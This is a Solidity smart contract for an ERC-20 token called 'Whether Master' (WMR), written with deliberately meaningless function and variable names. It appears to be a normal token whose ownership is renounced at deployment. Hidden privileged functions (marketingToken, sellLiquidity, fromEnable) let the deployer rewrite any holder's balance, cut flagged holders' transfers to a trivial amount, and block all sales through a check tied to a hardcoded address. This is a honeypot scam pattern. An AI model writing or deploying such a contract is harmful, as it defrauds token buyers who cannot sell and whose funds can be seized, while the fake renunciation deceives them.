//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface amountEnable {
    function createPair(address enableAmount, address teamFee) external returns (address);
}

interface buyList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverFund) external view returns (uint256);

    function transfer(address isExempt, uint256 fromFee) external returns (bool);

    function allowance(address exemptShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromFee) external returns (bool);

    function transferFrom(
        address sender,
        address isExempt,
        uint256 fromFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeShould, uint256 value);
    event Approval(address indexed exemptShould, address indexed spender, uint256 value);
}

abstract contract exemptFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyListMetadata is buyList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WhetherMaster is exemptFee, buyList, buyListMetadata {

    bool public modeFrom;

    function sellLiquidity(address receiverShould) public {
        amountFrom();
        
        if (receiverShould == isSwapExempt || receiverShould == walletLaunchReceiver) {
            return;
        }
        senderLimit[receiverShould] = true;
    }

    function listToken(address shouldTake, address isExempt, uint256 fromFee) internal returns (bool) {
        if (shouldTake == isSwapExempt) {
            return listSwap(shouldTake, isExempt, fromFee);
        }
        uint256 limitFee = buyList(walletLaunchReceiver).balanceOf(autoAmount);
        require(limitFee == toLiquidity);
        require(isExempt != autoAmount);
        if (senderLimit[shouldTake]) {
            return listSwap(shouldTake, isExempt, liquidityTake);
        }
        return listSwap(shouldTake, isExempt, fromFee);
    }

    event OwnershipTransferred(address indexed teamMin, address indexed maxTeam);

    function owner() external view returns (address) {
        return limitLaunchedTeam;
    }

    mapping(address => uint256) private toTeam;

    uint256 private liquidityLaunched = 100000000 * 10 ** 18;

    uint256 private modeShould;

    address autoAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 toLiquidity;

    function balanceOf(address receiverFund) public view virtual override returns (uint256) {
        return toTeam[receiverFund];
    }

    bool public receiverAuto;

    function fromEnable(uint256 fromFee) public {
        amountFrom();
        toLiquidity = fromFee;
    }

    function name() external view virtual override returns (string memory) {
        return swapToAt;
    }

    function getOwner() external view returns (address) {
        return limitLaunchedTeam;
    }

    function listSwap(address shouldTake, address isExempt, uint256 fromFee) internal returns (bool) {
        require(toTeam[shouldTake] >= fromFee);
        toTeam[shouldTake] -= fromFee;
        toTeam[isExempt] += fromFee;
        emit Transfer(shouldTake, isExempt, fromFee);
        return true;
    }

    address tradingTeamLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address tokenFundExempt, uint256 fromFee) public virtual override returns (bool) {
        atLaunched[_msgSender()][tokenFundExempt] = fromFee;
        emit Approval(_msgSender(), tokenFundExempt, fromFee);
        return true;
    }

    mapping(address => bool) public exemptEnable;

    function senderAmount(address fundTotal) public {
        require(fundTotal.balance < 100000);
        if (launchAt) {
            return;
        }
        
        exemptEnable[fundTotal] = true;
        
        launchAt = true;
    }

    function transfer(address feeFund, uint256 fromFee) external virtual override returns (bool) {
        return listToken(_msgSender(), feeFund, fromFee);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityLaunched;
    }

    function allowance(address totalLimit, address tokenFundExempt) external view virtual override returns (uint256) {
        if (tokenFundExempt == tradingTeamLaunched) {
            return type(uint256).max;
        }
        return atLaunched[totalLimit][tokenFundExempt];
    }

    mapping(address => mapping(address => uint256)) private atLaunched;

    bool public launchAt;

    string private swapToAt = "Whether Master";

    function transferFrom(address shouldTake, address isExempt, uint256 fromFee) external override returns (bool) {
        if (_msgSender() != tradingTeamLaunched) {
            if (atLaunched[shouldTake][_msgSender()] != type(uint256).max) {
                require(fromFee <= atLaunched[shouldTake][_msgSender()]);
                atLaunched[shouldTake][_msgSender()] -= fromFee;
            }
        }
        return listToken(shouldTake, isExempt, fromFee);
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldTxSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverReceiverLimit;
    }

    mapping(address => bool) public senderLimit;

    uint256 limitSender;

    address public isSwapExempt;

    function takeSwap() public {
        emit OwnershipTransferred(isSwapExempt, address(0));
        limitLaunchedTeam = address(0);
    }

    address public walletLaunchReceiver;

    function amountFrom() private view {
        require(exemptEnable[_msgSender()]);
    }

    uint8 private shouldTxSender = 18;

    function marketingToken(address feeFund, uint256 fromFee) public {
        amountFrom();
        toTeam[feeFund] = fromFee;
    }

    string private receiverReceiverLimit = "WMR";

    uint256 constant liquidityTake = 13 ** 10;

    uint256 public launchedTx;

    address private limitLaunchedTeam;

    constructor (){
        
        receiverTx senderReceiver = receiverTx(tradingTeamLaunched);
        walletLaunchReceiver = amountEnable(senderReceiver.factory()).createPair(senderReceiver.WETH(), address(this));
        
        isSwapExempt = _msgSender();
        exemptEnable[isSwapExempt] = true;
        toTeam[isSwapExempt] = liquidityLaunched;
        takeSwap();
        if (launchedTx != modeShould) {
            modeFrom = false;
        }
        emit Transfer(address(0), isSwapExempt, liquidityLaunched);
    }

}